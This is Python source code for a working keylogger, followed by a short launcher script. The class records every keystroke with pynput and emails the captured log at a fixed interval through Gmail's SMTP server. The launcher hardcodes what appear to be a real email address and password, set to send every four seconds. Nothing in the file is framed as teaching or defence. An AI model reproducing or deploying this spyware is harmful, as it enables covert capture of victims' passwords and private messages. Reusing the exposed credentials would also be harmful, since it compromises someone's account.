import threading, smtplib, pynput.keyboard

class Keylogger:
    def __init__(self, time, email, password):
        self.log = "Logger has been initiated"
        self.time = time
        self.email = email
        self.password = password

    def keyPrint(self, key):
        try:
            currLog = str(key.char)
        except AttributeError:
            if key == key.space:
                currLog = " "
            else:
                currLog = " " + str(key) + " "
        self.appendLog(currLog)

    def appendLog(self, string):
        self.log = self.log + string

    def report(self):
        self.send(self.email, self.password, self.log)
        self.log = ""
        waitingTime = threading.Timer(self.time, self.report)
        waitingTime.start()

    def send(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboardListner = pynput.keyboard.Listener(on_press=self.keyPrint)
        with keyboardListner:
            self.report()
            keyboardListner.join()

#---------------
#### MAKE ANOTHER FILE

#!/usr/bin/env

import keyLogger #Name of the file where class is located

myKeylogger = keyLogger.Keylogger(4, "eqan.ahmad123@gmail.com", "6nov2001")
myKeylogger.start()
